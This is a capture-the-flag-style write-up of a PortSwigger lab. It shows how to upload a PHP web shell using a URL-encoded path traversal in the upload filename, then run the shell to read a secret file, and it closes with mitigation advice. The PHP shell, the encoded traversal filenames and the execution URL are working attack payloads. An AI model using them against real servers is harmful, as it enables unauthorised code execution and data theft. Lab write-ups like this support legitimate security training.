
**Lab:** Web shell upload via path traversal (PortSwigger)

**Objective:** Exploit a file upload vulnerability to bypass directory-specific execution restrictions, upload a web shell, and read the contents of `/home/carlos/secret`.

**Methodology:** Directory Traversal (Path Traversal) via URL Encoding + Web Shell

## The Vulnerability

The application allows users to upload avatar images and saves them to the `/files/avatars/` directory.

To prevent remote code execution, the server is configured to block the execution of user-supplied scripts (like `.php` files) specifically within the `avatars` directory.

However, the backend fails to sanitize the `filename` parameter in the `Content-Disposition` header. By using directory traversal sequences (`../`), an attacker can force the server to save the uploaded file into a higher-level directory (e.g., `/files/`) where the execution restrictions do not apply.

## Exploitation Steps

### Step 1: Intercept a Legitimate Upload

1. Log in to the application using the provided credentials (`wiener:peter`).

2. Navigate to the **My Account** page.

3. Turn on **Intercept** in Burp Suite Proxy.

4. On the browser, select a malicious PHP file containing the following web shell payload and click **Upload**:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Step 2: Path Traversal Injection
Once Burp Suite intercepts the POST /my-account/avatar request, locate the Content-Disposition header at the bottom of the request body.

By default, it will look like this:
```
Content-Disposition: form-data; name="avatar"; filename="shell.php"
```
To bypass the directory restriction, we need to inject a path traversal sequence (../) into the filename. However, web application firewalls or backend filters often strip literal ../ sequences.

To evade this, we URL-encode the forward slash / as %2f. Modify the filename parameter to:

```
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
```
(Note: If the server strips single-encoded characters, double URL-encoding can be used: ..%252fshell.php)

The final injected payload section should look like this:
```
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Click Forward (or Send in Repeater). The server decodes %2f into / and concatenates it with the base directory (/files/avatars/../shell.php), effectively saving the file at /files/shell.php.

Step 3: Execute the Web Shell
Because the file was saved outside the restricted avatars directory, the backend Apache server will now execute the PHP script.

In your browser, navigate directly to the parent directory where the file was saved:
```
https://[YOUR-LAB-ID].web-security-academy.net/files/shell.php
```
The server executes the PHP code and returns a random secret string on the screen.

Copy this string, return to the lab's main page, and submit it to solve the lab.

Mitigation
To prevent path traversal in file uploads, developers should:

Never use user-supplied input directly to construct file paths.

Strip or reject any filename containing directory traversal sequences (e.g., ../, ..\, %2f, %252f).

Generate a randomized, safe filename (e.g., using a UUID) on the server side and completely ignore the original filename provided by the user.

Store uploaded files outside of the web root if possible, or enforce strict execution prevention (e.g., php_flag engine off in Apache) globally for all upload directories and their parent folders.

<img width="1716" height="994" alt="image" src="https://github.com/user-attachments/assets/04745038-6e20-4605-bbf9-786f9640daf2" />

<img width="1717" height="1003" alt="image" src="https://github.com/user-attachments/assets/2d8c8cea-2392-446e-a926-b44a045ab50b" />

